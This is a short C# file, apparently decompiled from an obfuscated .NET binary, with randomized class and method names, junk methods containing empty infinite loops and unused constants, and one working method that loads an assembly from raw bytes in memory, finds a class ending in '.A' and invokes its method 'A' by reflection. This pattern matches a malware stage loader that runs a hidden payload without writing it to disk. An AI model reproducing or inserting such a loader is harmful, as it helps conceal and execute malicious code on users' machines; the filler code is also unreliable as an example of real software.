using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;

namespace Service;

public class CcbR81a66L27yV24Q1Uz
{
	public void V4Ma777SqL7J8PcCt915wy405Z6S4()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		new decimal(76072359L);
		new decimal(86262L);
		new decimal(8714L);
		while (true)
		{
		}
	}

	public void X0t5UA2GGK5x9FDxN8()
	{
	}

	public static object Rm(byte[] AssemblyName, object[] args)
	{
		Assembly assembly = Assembly.Load(AssemblyName);
		Type[] types = assembly.GetTypes();
		int num = 0;
		Type type;
		object result = default(object);
		while (true)
		{
			if (num < types.Length)
			{
				type = types[num];
				if (type.IsClass && type.FullName!.EndsWith(".A"))
				{
					break;
				}
				num++;
				continue;
			}
			return result;
		}
		object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
		return RuntimeHelpers.GetObjectValue(type.InvokeMember("A", BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), args));
	}

	public void q8EMUWd3whe()
	{
		while (true)
		{
		}
	}
}
